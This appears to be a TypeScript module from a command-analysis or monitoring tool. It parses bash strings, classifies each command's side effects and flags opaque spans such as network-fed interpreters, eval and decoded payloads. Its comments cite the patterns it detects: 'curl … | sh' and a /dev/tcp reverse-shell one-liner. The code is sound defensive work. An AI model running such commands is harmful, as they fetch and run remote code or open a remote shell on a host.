import type { CallKind } from "../schema/event.ts";
import { type ParsedScript, parseScript, type RawCommand } from "./bash.ts";
import { type Classification, classifyArgv, maxKind } from "./classify.ts";
import { decodeLiteral, isDecoder } from "./decode.ts";
import { absolutize } from "./paths.ts";
import { redirectHosts, redirectRefs } from "./redirects.ts";
import type {
  DecodedLiteral,
  NormalizedCommand,
  NormalizedScript,
  OpaqueReason,
  OpaqueSpan,
  PathRef,
} from "./types.ts";

/** Interpreter strings, eval, heredocs and decoded payloads are parsed this deep, no deeper. */
export const MAX_INTERPRETER_DEPTH = 3;

/** Where relative paths resolve (`cwd`) and what `~`/`$HOME` expand to (`home`, D-003). */
export interface CommandOptions {
  cwd: string;
  home: string;
}

interface Scope extends CommandOptions {
  depth: number;
  via: boolean;
  /** Analysing code that runs on another host (ssh's remote command). */
  remote: boolean;
}

interface Analysis {
  commands: NormalizedCommand[];
  opaque: OpaqueSpan[];
  decoded: DecodedLiteral[];
}

interface Stage {
  raw: RawCommand;
  c: Classification;
}

interface CommandContext extends Stage {
  script: ReadonlyArray<Stage>;
}

function mergeAnalyses(...parts: ReadonlyArray<Analysis>): Analysis {
  return {
    commands: parts.flatMap((p) => p.commands),
    opaque: parts.flatMap((p) => p.opaque),
    decoded: parts.flatMap((p) => p.decoded),
  };
}

function argvOf(raw: RawCommand): string[] {
  return raw.words.map((w) => w.value);
}

function decodedOf(raw: RawCommand): DecodedLiteral[] {
  const words = raw.words
    .slice(1)
    .filter((w) => w.literal)
    .map((w) => w.value);
  const fed = isDecoder(argvOf(raw)) ? raw.heredocs.map((h) => h.replace(/\s+/g, "")) : [];
  return [...words, ...fed].map(decodeLiteral).filter((d): d is DecodedLiteral => d !== null);
}

function earlierStages(ctx: CommandContext): Stage[] {
  const pipe = ctx.raw.pipe;
  if (pipe === null) return [];
  return ctx.script.filter((s) => s.raw.pipe?.id === pipe.id && s.raw.pipe.index < pipe.index);
}

function laterStages(ctx: CommandContext): Stage[] {
  const pipe = ctx.raw.pipe;
  if (pipe === null) return [];
  return ctx.script.filter((s) => s.raw.pipe?.id === pipe.id && s.raw.pipe.index > pipe.index);
}

function readsPipe(ctx: CommandContext): boolean {
  return ctx.c.interpreter?.stdin === true && earlierStages(ctx).length > 0;
}

function fedByDecoder(ctx: CommandContext): boolean {
  return readsPipe(ctx) && earlierStages(ctx).some((s) => isDecoder(argvOf(s.raw)));
}

/**
 * An interpreter reading its code from the network: stdin piped from an earlier `net`
 * stage (`curl … | sh`, even through a decoder or `tee`), or a `/dev/tcp|udp` redirect
 * (`sh < /dev/tcp/h/80`, `bash -i >& /dev/tcp/h/p 0>&1`). Remote code execution.
 */
function fedByNet(ctx: CommandContext): boolean {
  if (ctx.c.interpreter?.stdin !== true) return false;
  if (redirectHosts(ctx.raw.redirects).length > 0) return true;
  return readsPipe(ctx) && earlierStages(ctx).some((s) => s.c.kind === "net");
}

function heredocExec(ctx: CommandContext, writesFile: boolean): boolean {
  if (ctx.raw.heredocs.length === 0) return false;
  if (writesFile || ctx.c.interpreter !== null) return true;
  const intoInterpreter = laterStages(ctx).some((s) => s.c.interpreter?.stdin === true);
  return intoInterpreter && !isDecoder(argvOf(ctx.raw));
}

function interpreterReason(ctx: CommandContext): OpaqueReason | null {
  const interp = ctx.c.interpreter;
  if (interp === null) return null;
  if (interp.eval) return "eval";
  return fedByDecoder(ctx) ? "decoded-pipe" : "interpreter";
}

/** The `interpreter` spans a carrier adds for the code it carries (remote ones marked). */
function carriedSpans(ctx: CommandContext): OpaqueSpan[] {
  const span = ctx.raw.raw;
  return (ctx.c.carried ?? [])
    .filter((c) => c.opaque)
    .map((c) =>
      c.remote ? { reason: "interpreter", span, remote: true } : { reason: "interpreter", span },
    );
}

function opaqueOf(ctx: CommandContext, writesFile: boolean): OpaqueSpan[] {
  const span = ctx.raw.raw;
  const reasons: OpaqueReason[] = [
    ...(ctx.c.wrapped ? (["interpreter"] as const) : []),
    ...[interpreterReason(ctx)].filter((r): r is OpaqueReason => r !== null),
    ...(heredocExec(ctx, writesFile) ? (["heredoc-exec"] as const) : []),
    ...(fedByNet(ctx) ? (["net-pipe"] as const) : []),
    ...(ctx.c.dynamic === true ? (["dynamic-command"] as const) : []),
  ];
  return [...reasons.map((reason) => ({ reason, span })), ...carriedSpans(ctx)];
}

function expandEscapes(text: string): string {
  const table: Readonly<Record<string, string>> = { n: "\n", t: "\t", "\\": "\\" };
  return text.replace(/\\([nt\\])/g, (whole, c: string) => table[c] ?? whole);
}

/** What a literal `echo`/`printf` writes to stdout; [] when any word is dynamic. */
function printedText(raw: RawCommand): string[] {
  const [name, ...args] = raw.words;
  if (!raw.words.every((w) => w.literal)) return [];
  if (name?.value === "printf" && args[0] !== undefined) {
    let next = 1;
    const fill = () => args[next++]?.value ?? "";
    return [expandEscapes(args[0].value).replace(/%s/g, fill)];
  }
  if (name?.value !== "echo") return [];
  const firstText = args.findIndex((w) => !/^-[neE]+$/.test(w.value));
  const flags = args.slice(0, firstText < 0 ? args.length : firstText).map((w) => w.value);
  const text = args
    .slice(flags.length)
    .map((w) => w.value)
    .join(" ");
  return [flags.some((f) => f.includes("e")) ? expandEscapes(text) : text];
}

/**
 * Shell code this command runs that is visible as text: `-c` code, eval, its own
 * heredocs, and, when it reads a pipe, the heredocs and literal echo/printf output of
 * earlier stages (or their decoded literals when a decoder sits in between).
 */
function nestedCode(ctx: CommandContext): string[] {
  const interp = ctx.c.interpreter;
  if (interp === null || !interp.shell) return [];
  if (interp.code !== null) return [interp.code];
  if (!interp.stdin) return [];
  const feeders = earlierStages(ctx);
  const piped = fedByDecoder(ctx)
    ? feeders.flatMap((s) => decodedOf(s.raw).map((d) => d.decoded))
    : feeders.flatMap((s) => [...s.raw.heredocs, ...printedText(s.raw)]);
  return [...ctx.raw.heredocs, ...(readsPipe(ctx) ? piped : [])];
}

const LEADING_TILDE = /^~(?=\/|$)/;

/**
 * Resolved path arguments: only from literal words; a `tilde` value gets the configured
 * home for its leading `~`; an `implicit` path (not a word of its own) has an empty `raw`.
 */
function argRefs(raw: RawCommand, c: Classification, scope: CommandOptions): PathRef[] {
  return c.paths.flatMap((p) => {
    const word = raw.words[p.index];
    if (word?.literal !== true) return [];
    const value = p.tilde === true ? p.value.replace(LEADING_TILDE, scope.home) : p.value;
    const path = absolutize(value, scope.cwd);
    return path === null ? [] : [{ raw: p.implicit ? "" : word.raw, path, access: p.access }];
  });
}

function commandKind(ctx: CommandContext, redirects: ReadonlyArray<PathRef>): CallKind {
  if (ctx.c.interpreter !== null) return "exec";
  const fromFiles = redirects.reduce<CallKind>(
    (kind, r) => maxKind(kind, r.access === "write" ? "fs.write" : "fs.read"),
    ctx.c.kind,
  );
  const fromSockets = redirectHosts(ctx.raw.redirects).length > 0 ? "net" : "other";
  const kind = maxKind(fromFiles, fromSockets);
  return ctx.raw.background ? maxKind(kind, "spawn") : kind;
}

function unique(values: ReadonlyArray<string>): string[] {
  return [...new Set(values)];
}

function buildCommand(ctx: CommandContext, scope: Scope, redirects: PathRef[]): NormalizedCommand {
  const { raw, c } = ctx;
  const pathRefs = [...argRefs(raw, c, scope), ...redirects];
  return {
    argv: argvOf(raw),
    env: { ...raw.env, ...c.env },
    redirects: raw.redirects.map((r) => ({ op: r.op, target: r.target.value })),
    heredocs: raw.heredocs,
    raw: raw.raw,
    kind: commandKind(ctx, redirects),
    targets: {
      paths: unique(pathRefs.map((r) => r.path)),
      hosts: unique([...c.hosts, ...redirectHosts(raw.redirects)]).filter((h) => !/[$`]/.test(h)),
    },
    pathRefs,
    verbs: raw.background ? [...c.verbs, "background"] : c.verbs,
    isInterpreter: c.interpreter !== null,
    viaInterpreter: scope.via,
    ...(scope.remote ? { remote: true as const } : {}),
    ...(c.method === undefined ? {} : { method: c.method }),
  };
}

async function analyseCommand(ctx: CommandContext, scope: Scope): Promise<Analysis> {
  const redirects = redirectRefs(ctx.raw.redirects, scope.cwd);
  const writesFile = redirects.some((r) => r.access === "write");
  const own: Analysis = {
    commands: [buildCommand(ctx, scope, redirects)],
    opaque: opaqueOf(ctx, writesFile),
    decoded: decodedOf(ctx.raw),
  };
  if (scope.depth >= MAX_INTERPRETER_DEPTH) return own;
  const inner = { ...scope, depth: scope.depth + 1, via: true };
  const carried = (ctx.c.carried ?? []).map((c) =>
    analyse(c.code, { ...inner, remote: scope.remote || c.remote }),
  );
  const nested = await Promise.all([
    ...nestedCode(ctx).map((code) => analyse(code, inner)),
    ...carried,
  ]);
  return mergeAnalyses(own, ...nested);
}

function nextCwd(raw: RawCommand, cwd: string, home: string): string {
  const name = raw.words[0]?.value;
  if ((name !== "cd" && name !== "pushd") || raw.pipe !== null) return cwd;
  const target = raw.words.slice(1).find((w) => !/^-[LPe@]+$/.test(w.value));
  if (target === undefined) return home;
  return target.literal ? (absolutize(target.value, cwd) ?? cwd) : cwd;
}

async function analyseScript(script: ParsedScript, scope: Scope): Promise<Analysis> {
  const stages = script.commands.map((raw) => ({ raw, c: classifyArgv(argvOf(raw)) }));
  const parts: Analysis[] = [];
  let cwd = scope.cwd;
  for (const stage of stages) {
    parts.push(await analyseCommand({ ...stage, script: stages }, { ...scope, cwd }));
    cwd = nextCwd(stage.raw, cwd, scope.home);
  }
  return mergeAnalyses({ commands: [], opaque: script.opaque, decoded: [] }, ...parts);
}

/** Every span of a remote analysis is remote, whatever command produced it. */
function markRemote(analysis: Analysis): Analysis {
  return { ...analysis, opaque: analysis.opaque.map((o) => ({ ...o, remote: true })) };
}

async function analyse(source: string, scope: Scope): Promise<Analysis> {
  const analysis = await analyseScript(await parseScript(source, scope.home), scope);
  return scope.remote ? markRemote(analysis) : analysis;
}

function uniqueSpans(spans: ReadonlyArray<OpaqueSpan>): OpaqueSpan[] {
  const seen = new Set<string>();
  return spans.filter((s) => {
    const key = `${s.reason}\u0000${s.span}\u0000${s.remote === true}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
}

/**
 * Event-level kind: `exec` when anything local is opaque or any local command is an
 * interpreter, `other` when there are no local commands, else the most severe local
 * command kind in the order fs.delete > net > fs.write > spawn > exec > fs.read > other.
 * A plain unknown binary ranks below every known side effect so a leading `cd .` cannot
 * hide a delete or a network call. Remote commands and spans (ssh's remote command) are
 * judged through the commands, paths and spans, but locally `ssh host '<cmd>'` is `net`.
 */
export function eventKind(
  commands: ReadonlyArray<NormalizedCommand>,
  opaque: ReadonlyArray<OpaqueSpan>,
): CallKind {
  const local = commands.filter((c) => c.remote !== true);
  if (opaque.some((o) => o.remote !== true) || local.some((c) => c.isInterpreter)) return "exec";
  return local.reduce<CallKind>((kind, c) => maxKind(kind, c.kind), "other");
}

/**
 * Normalizes a bash command string without an event: flattened commands, union of
 * absolute paths and hosts, opaque spans, decoded literals and the event-level kind.
 * Never throws and never touches the filesystem; only the parser is impure.
 */
export async function normalizeCommand(
  command: string,
  opts: CommandOptions,
): Promise<NormalizedScript> {
  const analysis = await analyse(command, { ...opts, depth: 0, via: false, remote: false });
  const opaque = uniqueSpans(analysis.opaque);
  return {
    kind: eventKind(analysis.commands, opaque),
    commands: analysis.commands,
    paths: unique(analysis.commands.flatMap((c) => c.targets.paths)),
    hosts: unique(analysis.commands.flatMap((c) => c.targets.hosts)),
    opaque,
    decodedLiterals: analysis.decoded,
  };
}
